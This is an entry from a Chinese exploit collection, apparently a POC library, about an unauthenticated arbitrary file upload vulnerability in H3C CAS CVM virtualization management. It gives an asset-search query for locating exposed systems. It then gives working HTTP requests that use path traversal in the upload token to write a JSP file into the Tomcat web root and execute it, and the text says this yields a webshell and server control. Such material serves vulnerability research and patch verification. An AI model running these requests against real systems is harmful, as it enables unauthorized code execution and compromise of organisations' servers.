---
fofa: "app.name="
source: "wy876 漏洞文库"
---

# H3C CVM 前台任意文件上传漏洞

# 一、漏洞简介
H3C公司依托其强大的技术实力、产品与服务优势，以及深入人心的以客户为中心的理念，为企业数据中心IaaS云计算基础架构提供最优化的虚拟化与云业务运营解决方案。通过H3C CAS CVM虚拟化管理系统实现数据中心虚拟化环境的中央管理控制，以简洁的管理界面，统一管理数据中心内所有的物理资源和虚拟资源，不仅能提高管理员的管控能力、简化日常例行工作，更可降低IT环境的复杂度和管理成本。H3C CVM存在任意文件上传漏洞，攻击者可以上传任意文件，获取webshell，控制服务器权限，读取敏感信息等。

# 二、影响版本
+ H3C CVM

## 三、资产测绘
+ hunter `app.name="H3C CAS 云服务"`
+ 特征


## 四、漏洞复现
```plain
POST /cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/stc.jsp&name=222 HTTP/1.1
Host: xx.xx.xx.xx
Content-Range: bytes 0-10/20
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 23

<%out.print("99999");%>
```


文件上传位置，请求需携带请求头Content-Range: bytes 0-10/20

```plain
GET /cas/js/lib/buttons/stc.jsp HTTP/1.1
Host: xx.xx.xx.xx
Content-Range: bytes 0-10/20
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/nwfsvgilkdhpnsd0>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
